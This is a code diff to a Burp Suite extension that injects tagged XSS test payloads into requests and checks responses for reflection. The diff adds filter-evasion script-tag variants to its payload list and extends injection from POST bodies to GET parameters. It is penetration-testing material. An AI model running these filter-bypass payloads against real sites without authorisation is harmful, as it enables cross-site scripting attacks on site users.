@@ -28,6 +28,8 @@ except ImportError:
 
 PAYLOADS = [
     '<script>alert(1)</script>',
+    '<script><script>alert(1)</script>',
+    '<script >alert(1)</script >',
     '<<SCRIPT>alert(1);//\<</SCRIPT>',
     '<scrscriptipt>alert(1)</scrscriptipt>',
     '¼script¾alert(1)¼/script¾',
@@ -90,8 +92,7 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory):
             body = currentRequest.getRequest()  # return byte[]
             requestInfo = self._helpers.analyzeRequest(
                 currentRequest)  # returns IResponseInfo
-            paraList = requestInfo.getParameters()  # array
-            # print 'paraList',paraList
+            paraList = requestInfo.getParameters()
             new_requestInfo = body
             white_action = ['action', 'sign']
             for para in paraList:
@@ -103,7 +104,7 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory):
                                                            para.getType())
                     new_requestInfo = self._helpers.updateParameter(
                         new_requestInfo,
-                        newPara)  # updateParameter(byte[],IParameter) return byte[]
+                        newPara)
 
             currentRequest.setRequest(new_requestInfo)
 
@@ -160,16 +161,42 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory):
                     request)
                 headers = analyzedRequest.getHeaders()
                 body = request[analyzedRequest.getBodyOffset():]
-                body_string = body.tostring()
-                self.payload = re.search(r'{XSS}[^{]+{XSS}', body_string)
-                if self.payload:
-                    new_body_string = body_string.replace(PAYLOAD_TAG, '')
-                    new_body = self._helpers.bytesToString(new_body_string)
-                    self.payload = self.payload.group(0).replace(PAYLOAD_TAG, '')
-                    messageInfo.setRequest(
-                        self._helpers.buildHttpMessage(headers, new_body)
-                    )
-            if not messageIsRequest:
+                if self._helpers.analyzeRequest(
+                        messageInfo.getRequest()).getMethod() == 'POST':
+                    body_string = body.tostring()
+                    self.payload = re.search(r'{XSS}[^{]+{XSS}', body_string)
+                    if self.payload:
+                        new_body_string = body_string.replace(PAYLOAD_TAG, '')
+                        new_body = self._helpers.bytesToString(new_body_string)
+                        self.payload = self.payload.group(0).replace(
+                            PAYLOAD_TAG, ''
+                        )
+                        messageInfo.setRequest(
+                            self._helpers.buildHttpMessage(headers, new_body)
+                        )
+                elif self._helpers.analyzeRequest(
+                        messageInfo.getRequest()).getMethod() == 'GET':
+                    parameters = self._helpers.analyzeRequest(
+                        messageInfo.getRequest()).getParameters()
+                    request_body = messageInfo.getRequest()
+                    new_request = request_body
+                    for parameter in parameters:
+                        value = parameter.getValue()
+                        payload_search = re.search(r'{XSS}[^{]+{XSS}', value)
+                        if payload_search:
+                            value = value.replace(PAYLOAD_TAG, '')
+                            self.payload = payload_search.group(0).replace(
+                                PAYLOAD_TAG, ''
+                            )
+                            key = parameter.getName()
+                            new_parameter = self._helpers.buildParameter(
+                                key, value, parameter.getType())
+                            new_request = self._helpers.updateParameter(
+                                new_request,
+                                new_parameter)
+                    messageInfo.setRequest(new_request)
+
+            if not messageIsRequest and self.payload:
                 response = messageInfo.getResponse()
                 analyzedResponse = self._helpers.analyzeResponse(
                     response)
